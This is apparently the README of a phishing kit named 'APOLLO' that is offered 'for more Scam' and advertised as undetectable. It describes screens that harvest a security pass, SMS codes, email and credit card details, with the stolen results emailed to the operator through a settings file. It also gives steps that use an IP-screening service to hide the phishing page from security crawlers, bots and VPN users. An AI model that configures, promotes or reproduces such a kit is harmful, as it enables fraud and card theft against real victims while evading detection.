
 ##########_____APOLLO_____#########
 
 ## latest version CA beta version 3.0 CLean fresh undetectable

 ## Date  : 01/08/20 

 ## DM me : apollo.c@mail.com   for more Scam or Others


Features
_______________

GET YOUR API TO PREVENT RED SITE , BOT , PROXY , VPN 
https://www.ipqualityscore.com/documentation/proxy-detection/overview


//Enable security in config setting


Pass Secur'

SMS CONNECT ( First login )
SMS    ( Next step )
EMAIL  (Final Step)
CC CARD ( GET CC INFO)




Uses 
_______________

config file's ./config/settings.php

Email for rez ./config/settings.php









